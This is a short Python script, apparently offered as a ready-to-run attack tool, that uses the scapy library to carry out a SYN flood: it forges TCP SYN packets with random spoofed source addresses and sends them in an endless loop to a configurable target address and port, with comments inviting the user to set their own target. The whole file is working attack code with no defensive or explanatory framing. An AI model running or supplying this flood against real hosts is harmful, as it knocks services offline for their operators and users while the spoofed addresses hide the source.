from scapy.all import IP, TCP, send
import random

# Define the target IP and port
target_ip = "10.25.10.40" # Change to your target IP
target_port = 80  # Change to your target port

# Function to generate a random IP address
def random_ip():
    return ".".join(map(str, (random.randint(0, 255) for _ in range(4))))

# Function to perform the SYN flood attack
def syn_flood(target_ip, target_port):
    while True:
        # Create a random source IP address and TCP SYN packet
        packet = IP(src=random_ip(), dst=target_ip) / TCP(sport=random.randint(1024, 65535), dport=target_port, flags="S")
        send(packet, verbose=False)

# Run the SYN flood attack
syn_flood(target_ip, target_port)
